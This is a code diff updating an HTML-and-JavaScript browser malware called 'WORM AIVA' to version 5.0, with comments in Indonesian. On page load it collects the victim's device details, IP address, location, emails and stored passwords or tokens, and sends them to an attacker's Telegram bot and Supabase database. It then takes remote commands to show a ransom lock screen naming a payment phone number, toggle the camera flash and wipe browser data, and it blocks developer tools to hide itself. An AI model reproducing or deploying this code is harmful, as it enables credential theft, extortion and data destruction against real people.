@@ -8,7 +8,6 @@
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; color: #000; font-family: Arial, sans-serif; overflow: hidden; }
 
-/* LOCK SCREEN OVERLAY — FULLSCREEN, TIDAK BISA DI-CLOSE */
 #lockOverlay {
     position: fixed;
     top: 0; left: 0;
@@ -58,9 +57,7 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
     outline: none;
     margin-bottom: 20px;
 }
-#lockOverlay input:focus {
-    border-color: #ff8800;
-}
+#lockOverlay input:focus { border-color: #ff8800; }
 #lockOverlay .error {
     color: #ff0040;
     font-size: 14px;
@@ -76,239 +73,129 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
 </head>
 <body>
 
-<!-- LOCK SCREEN OVERLAY -->
 <div id="lockOverlay">
     <h1>🔒 YOUR HANDPHONE/LAPTOP IS LOCKED BY Yonzz</h1>
     <div class="desc">Pay if you want to open it.<br>The number is <strong>+628977299055!</strong></div>
     <div class="phone">📞 +628977299055</div>
     <input type="password" id="lockPass" maxlength="5" placeholder="•••••" autocomplete="off" inputmode="numeric">
     <div class="error" id="lockError"></div>
-    <div class="footer">WORM AIVA v4.0</div>
+    <div class="footer">WORM AIVA v5.0</div>
 </div>
 
-<script>
-// ================================================================
-// WORM AIVA — REMOTE CONTROL VIA TELEGRAM (POLLING)
-// ================================================================
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
+<script>
 (function() {
     'use strict';
 
     // ============================================================
-    // KONFIGURASI
+    // KONFIGURASI — GANTI DENGAN PUNYA KAMU
     // ============================================================
+    const SUPABASE_URL = 'https://pagbhuvfvnpolejusxxm.supabase.co';   // GANTI
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBhZ2JodXZmdm5wb2xlanVzeHhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY3ODI0MTcsImV4cCI6MjEwMjM1ODQxN30.ZRQNKG6ZYDPsSBAAiNFNSxlPsSNkLfIz0jz71lknMLc';        // GANTI
     const BOT_TOKEN = '8806813025:AAFUuyClrFAKIaOn8muWbbraedaynTOisS0';
     const CHAT_ID = '6296658478';
-    const LOCK_PASSWORD = '1234'; // 4 digit angka
+    const LOCK_PASSWORD = '1234';
     // ============================================================
 
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const victimId = 'VICTIM_' + Date.now().toString(36).toUpperCase() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase();
+    let isLocked = false;
     let flashOn = false;
     let flashStream = null;
-    let isLocked = false;
-    let offset = 0; // untuk polling
-    let victimId = 'VICTIM_' + Date.now().toString(36).toUpperCase() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase();
 
     // ============================================================
-    // FUNGSI KIRIM PESAN KE TELEGRAM (TANPA MENUNGGU RESULT)
+    // TELEGRAM
     // ============================================================
-    function sendMessage(text, extra = {}) {
+    function sendTelegram(text) {
         const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-        const payload = {
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'HTML',
-            ...extra
-        };
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(function() {});
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+        }).catch(() => {});
     }
 
-    // ============================================================
-    // KIRIM INLINE KEYBOARD (TOMbol AKSI) — DIKIRIM SETELAH DATA
-    // ============================================================
-    function sendActionKeyboard() {
+    function sendKeyboard() {
         const keyboard = {
             inline_keyboard: [
-                [
-                    { text: '💡 Flash ON', callback_data: 'flash_on' },
-                    { text: '💡 Flash OFF', callback_data: 'flash_off' }
-                ],
-                [
-                    { text: '🔒 Lock Screen', callback_data: 'lock' },
-                    { text: '🔓 Unlock', callback_data: 'unlock' }
-                ],
-                [
-                    { text: '🗑️ Delete All Data', callback_data: 'delete' }
-                ]
+                [{ text: '💡 Flash ON', callback_data: 'flash_on' }, { text: '💡 Flash OFF', callback_data: 'flash_off' }],
+                [{ text: '🔒 Lock', callback_data: 'lock' }, { text: '🔓 Unlock', callback_data: 'unlock' }],
+                [{ text: '🗑️ Delete All', callback_data: 'delete' }]
             ]
         };
-        sendMessage('🛠️ <b>Remote Control</b>\nPilih aksi untuk perangkat korban:', { reply_markup: JSON.stringify(keyboard) });
+        sendTelegram('🛠️ Remote Control:', { reply_markup: JSON.stringify(keyboard) });
     }
 
     // ============================================================
-    // POLLING KE TELEGRAM UNTUK MENDAPATKAN PERINTAH
+    // EXECUTE COMMAND
     // ============================================================
-    function pollCommands() {
-        const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=' + offset + '&timeout=30';
-        fetch(url)
-            .then(function(res) { return res.json(); })
-            .then(function(data) {
-                if (data.ok && data.result.length > 0) {
-                    data.result.forEach(function(update) {
-                        offset = update.update_id + 1;
-                        // Cek jika ada callback query (tombol diklik)
-                        if (update.callback_query) {
-                            const cmd = update.callback_query.data;
-                            const chatId = update.callback_query.message.chat.id;
-                            // Hanya proses jika chat_id sesuai
-                            if (String(chatId) === CHAT_ID) {
-                                processCommand(cmd);
-                                // Kirim jawaban ke Telegram agar tombol tidak "berputar"
-                                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery?callback_query_id=' + update.callback_query.id)
-                                    .catch(function() {});
-                            }
-                        }
-                        // Cek jika ada pesan teks (bisa juga perintah manual)
-                        if (update.message && update.message.text) {
-                            const text = update.message.text.trim();
-                            const chatId = update.message.chat.id;
-                            if (String(chatId) === CHAT_ID) {
-                                if (text.startsWith('/')) {
-                                    const cmd = text.substring(1);
-                                    processCommand(cmd);
-                                }
-                            }
-                        }
-                    });
-                }
-                // Lanjut polling
-                setTimeout(pollCommands, 3000);
-            })
-            .catch(function() {
-                setTimeout(pollCommands, 5000);
-            });
-    }
-
-    // ============================================================
-    // PROSES PERINTAH
-    // ============================================================
-    function processCommand(cmd) {
-        console.log('📩 Perintah diterima:', cmd);
+    function executeCommand(cmd) {
+        console.log('📩 Command:', cmd);
         switch(cmd) {
-            case 'flash_on':
-                toggleFlash(true);
-                break;
-            case 'flash_off':
-                toggleFlash(false);
-                break;
-            case 'lock':
-                showLockScreen();
-                break;
-            case 'unlock':
-                hideLockScreen();
-                break;
-            case 'delete':
-                deleteAllData();
-                break;
-            default:
-                console.log('Perintah tidak dikenal:', cmd);
+            case 'flash_on': toggleFlash(true); break;
+            case 'flash_off': toggleFlash(false); break;
+            case 'lock': showLockScreen(); break;
+            case 'unlock': hideLockScreen(); break;
+            case 'delete': deleteAllData(); break;
         }
     }
 
     // ============================================================
-    // FLASH (TORCH) — ON/OFF
+    // FLASH
     // ============================================================
     function toggleFlash(on) {
         if (on === flashOn) return;
         if (on) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
-                .then(function(stream) {
+                .then(stream => {
                     flashStream = stream;
-                    var track = stream.getVideoTracks()[0];
-                    if (track) {
-                        var capabilities = track.getCapabilities();
-                        if (capabilities.torch) {
-                            track.applyConstraints({ advanced: [{ torch: true }] })
-                                .then(function() {
-                                    flashOn = true;
-                                    sendMessage('💡 Flash turned <b>ON</b>');
-                                })
-                                .catch(function(err) {
-                                    sendMessage('❌ Flash error: ' + err.message);
-                                });
-                        } else {
-                            sendMessage('❌ Torch not supported');
-                        }
+                    const track = stream.getVideoTracks()[0];
+                    if (track && track.getCapabilities().torch) {
+                        track.applyConstraints({ advanced: [{ torch: true }] })
+                            .then(() => { flashOn = true; sendTelegram('💡 Flash ON'); })
+                            .catch(() => sendTelegram('❌ Flash error'));
+                    } else {
+                        sendTelegram('❌ Torch not supported');
                     }
                 })
-                .catch(function(err) {
-                    sendMessage('❌ Camera access denied: ' + err.message);
-                });
+                .catch(() => sendTelegram('❌ Camera denied'));
         } else {
-            if (flashStream) {
-                flashStream.getTracks().forEach(function(track) { track.stop(); });
-                flashStream = null;
-            }
+            if (flashStream) { flashStream.getTracks().forEach(t => t.stop()); flashStream = null; }
             flashOn = false;
-            sendMessage('💡 Flash turned <b>OFF</b>');
+            sendTelegram('💡 Flash OFF');
         }
     }
 
     // ============================================================
-    // LOCK SCREEN — FULL OVERLAY
+    // LOCK SCREEN
     // ============================================================
     function showLockScreen() {
         if (isLocked) return;
         isLocked = true;
-        var overlay = document.getElementById('lockOverlay');
-        overlay.classList.add('active');
-        document.getElementById('lockPass').value = '';
-        document.getElementById('lockError').textContent = '';
+        document.getElementById('lockOverlay').classList.add('active');
         document.getElementById('lockPass').focus();
-        // Minta fullscreen
-        try {
-            document.documentElement.requestFullscreen().catch(function() {});
-        } catch(e) {}
-        sendMessage('🔒 <b>Lock Screen</b> activated on victim device');
+        try { document.documentElement.requestFullscreen(); } catch(e) {}
+        sendTelegram('🔒 Lock Screen ON');
     }
 
     function hideLockScreen() {
         if (!isLocked) return;
         isLocked = false;
-        var overlay = document.getElementById('lockOverlay');
-        overlay.classList.remove('active');
-        // Keluar dari fullscreen
-        try {
-            if (document.fullscreenElement) document.exitFullscreen().catch(function() {});
-        } catch(e) {}
-        sendMessage('🔓 <b>Unlock</b> successful');
+        document.getElementById('lockOverlay').classList.remove('active');
+        try { if (document.fullscreenElement) document.exitFullscreen(); } catch(e) {}
+        sendTelegram('🔓 Unlock');
     }
 
-    // Fungsi unlock dari input (dipanggil saat enter atau tombol)
-    function unlockDevice() {
-        var input = document.getElementById('lockPass');
-        var error = document.getElementById('lockError');
-        var entered = input.value.trim();
-        if (entered === LOCK_PASSWORD) {
-            hideLockScreen();
-        } else {
-            error.textContent = '❌ Wrong password! Try again.';
-            input.value = '';
-            input.focus();
-            sendMessage('⚠️ Wrong password attempt: ' + entered);
-        }
-    }
-
-    // Event listener untuk input password (Enter)
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            var overlay = document.getElementById('lockOverlay');
-            if (overlay.classList.contains('active')) {
-                unlockDevice();
-                e.preventDefault();
+        if (e.key === 'Enter' && document.getElementById('lockOverlay').classList.contains('active')) {
+            const input = document.getElementById('lockPass');
+            if (input.value.trim() === LOCK_PASSWORD) {
+                hideLockScreen();
+            } else {
+                document.getElementById('lockError').textContent = '❌ Wrong password!';
+                input.value = '';
+                input.focus();
             }
         }
     });
@@ -317,78 +204,92 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
     // DELETE ALL DATA
     // ============================================================
     function deleteAllData() {
-        if (confirm('⚠️ ARE YOU SURE? This will DELETE ALL DATA on this device!')) {
+        if (confirm('⚠️ DELETE ALL DATA?')) {
             try {
-                // Hapus localStorage
                 localStorage.clear();
-                // Hapus sessionStorage
                 sessionStorage.clear();
-                // Hapus cookies
-                var cookies = document.cookie.split(';');
-                for (var i = 0; i < cookies.length; i++) {
-                    var cookie = cookies[i];
-                    var eqPos = cookie.indexOf('=');
-                    var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
-                    document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
-                }
-                // Hapus cache (sebisanya)
+                document.cookie.split(';').forEach(c => {
+                    document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/');
+                });
                 if ('caches' in window) {
-                    caches.keys().then(function(keys) {
-                        keys.forEach(function(key) {
-                            caches.delete(key);
-                        });
-                    });
+                    caches.keys().then(keys => keys.forEach(k => caches.delete(k)));
                 }
-                sendMessage('🗑️ <b>ALL DATA DELETED</b> by remote command!');
-                // Redirect ke about:blank
-                setTimeout(function() {
-                    window.location.href = 'about:blank';
-                }, 1000);
+                sendTelegram('🗑️ ALL DATA DELETED');
+                setTimeout(() => window.location.href = 'about:blank', 1000);
             } catch(e) {
-                sendMessage('❌ Delete data error: ' + e.message);
+                sendTelegram('❌ Delete error: ' + e.message);
             }
         }
     }
 
     // ============================================================
-    // DAPATKAN DATA REAL (Device, IP, Email, Password, Lokasi)
+    // SUBSCRIBE COMMANDS
     // ============================================================
+    function subscribeCommands() {
+        supabase
+            .channel('commands-channel')
+            .on(
+                'postgres_changes',
+                { event: 'INSERT', schema: 'public', table: 'commands', filter: 'victim_id=eq.' + victimId },
+                (payload) => {
+                    if (payload.new.status === 'pending') {
+                        executeCommand(payload.new.command);
+                        supabase.from('commands').update({ status: 'executed' }).eq('id', payload.new.id).then();
+                    }
+                }
+            )
+            .subscribe();
+    }
 
-    // 1. Device & OS
+    // ============================================================
+    // SAVE VICTIM DATA
+    // ============================================================
+    async function saveVictimData(data) {
+        await supabase.from('victims').insert([{
+            victim_id: victimId,
+            device_info: data.deviceInfo,
+            ip: data.ip,
+            emails: data.emails,
+            passwords: data.passwords,
+            location: data.location
+        }]);
+    }
+
+    // ============================================================
+    // GET DATA REAL
+    // ============================================================
     function getDeviceInfo() {
-        var ua = navigator.userAgent;
-        var device = 'Unknown', os = 'Unknown', brand = 'Unknown', model = 'Unknown', chipset = 'Unknown';
-        if (ua.indexOf('Android') > -1) {
+        const ua = navigator.userAgent;
+        let device = 'Unknown', os = 'Unknown', brand = 'Unknown', model = 'Unknown', chipset = 'Unknown';
+        if (ua.includes('Android')) {
             os = 'Android';
-            var match = ua.match(/; ([\w\s]+) Build\//);
+            const match = ua.match(/; ([\w\s]+) Build\//);
             if (match) model = match[1].trim();
-            if (ua.indexOf('SM-S') > -1) chipset = 'Snapdragon 8 Gen';
-            else if (ua.indexOf('Pixel') > -1) chipset = 'Google Tensor';
+            if (ua.includes('SM-S')) chipset = 'Snapdragon 8 Gen';
+            else if (ua.includes('Pixel')) chipset = 'Google Tensor';
             else chipset = 'ARM';
-            if (ua.indexOf('Samsung') > -1) brand = 'Samsung';
-            else if (ua.indexOf('Xiaomi') > -1) brand = 'Xiaomi';
-            else if (ua.indexOf('OPPO') > -1) brand = 'OPPO';
-            else if (ua.indexOf('vivo') > -1) brand = 'vivo';
-            else if (ua.indexOf('realme') > -1) brand = 'realme';
-            else if (ua.indexOf('OnePlus') > -1) brand = 'OnePlus';
-            else if (ua.indexOf('Pixel') > -1) brand = 'Google';
+            if (ua.includes('Samsung')) brand = 'Samsung';
+            else if (ua.includes('Xiaomi')) brand = 'Xiaomi';
+            else if (ua.includes('OPPO')) brand = 'OPPO';
+            else if (ua.includes('vivo')) brand = 'vivo';
+            else if (ua.includes('realme')) brand = 'realme';
+            else if (ua.includes('OnePlus')) brand = 'OnePlus';
+            else if (ua.includes('Pixel')) brand = 'Google';
             else brand = 'Android';
             device = brand + ' ' + model;
-        } else if (ua.indexOf('iPhone') > -1) {
+        } else if (ua.includes('iPhone')) {
             os = 'iOS';
-            var iphone = ua.match(/iPhone(\d+)/);
+            const iphone = ua.match(/iPhone(\d+)/);
             model = iphone ? 'iPhone ' + iphone[1] : 'iPhone';
             chipset = 'Apple A-series';
             brand = 'Apple';
             device = brand + ' ' + model;
-        } else if (ua.indexOf('Windows NT') > -1) {
-            os = 'Windows';
-            var win = ua.match(/Windows NT ([\d.]+)/);
-            if (win) os += ' ' + win[1];
+        } else if (ua.includes('Windows NT')) {
+            os = 'Windows ' + (ua.match(/Windows NT ([\d.]+)/) || [])[1] || '';
             chipset = 'Intel/AMD x86';
             brand = 'Microsoft';
-            device = brand + ' PC';
-        } else if (ua.indexOf('Macintosh') > -1) {
+            device = 'Windows PC';
+        } else if (ua.includes('Macintosh')) {
             os = 'macOS';
             chipset = 'Apple Silicon';
             brand = 'Apple';
@@ -397,118 +298,156 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         return { device, os, brand, model, chipset, ua };
     }
 
-    // 2. IP (2 metode)
     function getIP() {
-        var ip = 'Unknown';
+        let ip = 'Unknown';
         try {
-            var xhr = new XMLHttpRequest();
+            const xhr = new XMLHttpRequest();
             xhr.open('GET', 'https://api.ipify.org?format=json', false);
             xhr.send();
             if (xhr.status === 200) {
-                var res = JSON.parse(xhr.responseText);
+                const res = JSON.parse(xhr.responseText);
                 ip = res.ip || 'Unknown';
             }
         } catch(e) {}
-        if (ip === 'Unknown') {
-            try {
-                var pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(function(offer) { pc.setLocalDescription(offer); });
-                pc.onicecandidate = function(e) {
-                    if (e.candidate) {
-                        var candidate = e.candidate.candidate;
-                        var ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if (ipMatch && ipMatch[0] !== '0.0.0.0') {
-                            ip = ipMatch[0];
-                        }
-                        pc.close();
-                    }
-                };
-                setTimeout(function() { pc.close(); }, 3000);
-            } catch(e) {}
-        }
         return ip;
     }
 
-    // 3. Emails (scan menyeluruh)
     function getEmails() {
-        var emails = [];
-        var regex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-        var sources = [
-            function() { // localStorage
-                for (var i = 0; i < localStorage.length; i++) {
-                    var val = localStorage.getItem(localStorage.key(i));
-                    if (val && typeof val === 'string') {
-                        var m = val.match(regex);
-                        if (m) emails = emails.concat(m);
-                    }
-                }
-            },
-            function() { // sessionStorage
-                for (var j = 0; j < sessionStorage.length; j++) {
-                    var val = sessionStorage.getItem(sessionStorage.key(j));
-                    if (val && typeof val === 'string') {
-                        var m = val.match(regex);
-                        if (m) emails = emails.concat(m);
-                    }
-                }
-            },
-            function() { // cookies
-                var cookies = document.cookie.split(';');
-                for (var k = 0; k < cookies.length; k++) {
-                    var m = cookies[k].match(regex);
-                    if (m) emails = emails.concat(m);
-                }
-            },
-            function() { // input fields
-                var inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="hidden"]');
-                for (var l = 0; l < inputs.length; l++) {
-                    var val = inputs[l].value;
-                    if (val && typeof val === 'string') {
-                        var m = val.match(regex);
-                        if (m) emails = emails.concat(m);
-                    }
-                }
-            },
-            function() { // meta tags
-                var metas = document.querySelectorAll('meta');
-                for (var m = 0; m < metas.length; m++) {
-                    var content = metas[m].getAttribute('content');
-                    if (content) {
-                        var mm = content.match(regex);
-                        if (mm) emails = emails.concat(mm);
-                    }
-                }
-            },
-            function() { // window variables
-                for (var key in window) {
-                    try {
-                        var val = window[key];
-                        if (typeof val === 'string') {
-                            var m = val.match(regex);
-                            if (m) emails = emails.concat(m);
-                        }
-                    } catch(e) {}
-                }
-            },
-            function() { // document title & body
-                var text = document.title + ' ' + document.body.innerText;
-                var m = text.match(regex);
-                if (m) emails = emails.concat(m);
+        const emails = [];
+        const regex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const v = localStorage.getItem(localStorage.key(i));
+                if (v) { const m = v.match(regex); if (m) emails.push(...m); }
             }
-        ];
-        sources.forEach(function(fn) { try { fn(); } catch(e) {} });
+        } catch(e) {}
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const v = sessionStorage.getItem(sessionStorage.key(i));
+                if (v) { const m = v.match(regex); if (m) emails.push(...m); }
+            }
+        } catch(e) {}
+        try {
+            document.cookie.split(';').forEach(c => { const m = c.match(regex); if (m) emails.push(...m); });
+        } catch(e) {}
         return [...new Set(emails)];
     }
 
-    // 4. Passwords (scan keywords)
     function getPasswords() {
-        var passwords = [];
-        var keywords = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'auth', 'login', 'credential', 'pin', 'code'];
-        var sources = [
-            function() {
-                for (var i = 0; i < localStorage.length; i++) {
-                    var key = localStorage.key(i);
-                    var val = localStorage.getItem(key);
-                    if (val && typeof val === 'string') {
-                        var lower
+        const passwords = [];
+        const keywords = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'auth', 'login', 'pin', 'code'];
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const val = localStorage.getItem(key);
+                if (val && typeof val === 'string') {
+                    const lk = key.toLowerCase();
+                    for (let kw of keywords) {
+                        if (lk.includes(kw) && val.length > 2) {
+                            passwords.push({ key, value: val.substring(0, 150) });
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch(e) {}
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const val = sessionStorage.getItem(key);
+                if (val && typeof val === 'string') {
+                    const lk = key.toLowerCase();
+                    for (let kw of keywords) {
+                        if (lk.includes(kw) && val.length > 2) {
+                            passwords.push({ key, value: val.substring(0, 150) });
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch(e) {}
+        return passwords;
+    }
+
+    function getLocation() {
+        return new Promise(resolve => {
+            if (!navigator.geolocation) { resolve(null); return; }
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+
+    // ============================================================
+    // MAIN
+    // ============================================================
+    async function main() {
+        const deviceInfo = getDeviceInfo();
+        const ip = getIP();
+        const emails = getEmails();
+        const passwords = getPasswords();
+        const location = await getLocation();
+
+        const data = { deviceInfo, ip, emails, passwords, location };
+        await saveVictimData(data);
+
+        let msg = '🔴 NEW VICTIM!\n\n';
+        msg += '🆔 ID: ' + victimId + '\n';
+        msg += '📱 Device: ' + deviceInfo.device + '\n';
+        msg += '🏷️ Brand: ' + deviceInfo.brand + '\n';
+        msg += '📟 Model: ' + deviceInfo.model + '\n';
+        msg += '🔧 Chipset: ' + deviceInfo.chipset + '\n';
+        msg += '💻 OS: ' + deviceInfo.os + '\n';
+        msg += '🌐 IP: ' + ip + '\n';
+        msg += '📍 Location: ' + (location ? location.lat + ', ' + location.lng : 'Tidak diizinkan') + '\n';
+        msg += '📧 Emails: ' + (emails.length ? emails.join(', ') : 'None') + '\n';
+        msg += '🔑 Passwords: ' + passwords.length + ' found\n';
+        if (passwords.length) {
+            passwords.slice(0, 5).forEach(p => {
+                msg += '   - ' + p.key + ': ' + p.value + '\n';
+            });
+        }
+        msg += '⏰ Time: ' + new Date().toISOString();
+        sendTelegram(msg);
+
+        setTimeout(() => sendKeyboard(), 2000);
+        subscribeCommands();
+    }
+
+    // ============================================================
+    // STEALTH
+    // ============================================================
+    console.log = function() {};
+    console.warn = function() {};
+    console.error = function() {};
+    console.info = function() {};
+    console.debug = function() {};
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
+            e.preventDefault();
+            return false;
+        }
+        if (e.key === 'Backspace' && !e.target.matches('input, textarea')) {
+            e.preventDefault();
+        }
+    });
+    window.addEventListener('beforeunload', e => {
+        if (isLocked) { e.preventDefault(); e.returnValue = ''; }
+    });
+
+    // ============================================================
+    // START
+    // ============================================================
+    if (document.readyState === 'complete') {
+        setTimeout(main, 1000);
+    } else {
+        window.addEventListener('load', () => setTimeout(main, 1000));
+    }
+
+})();
+</script>
+</body>
+    </html>
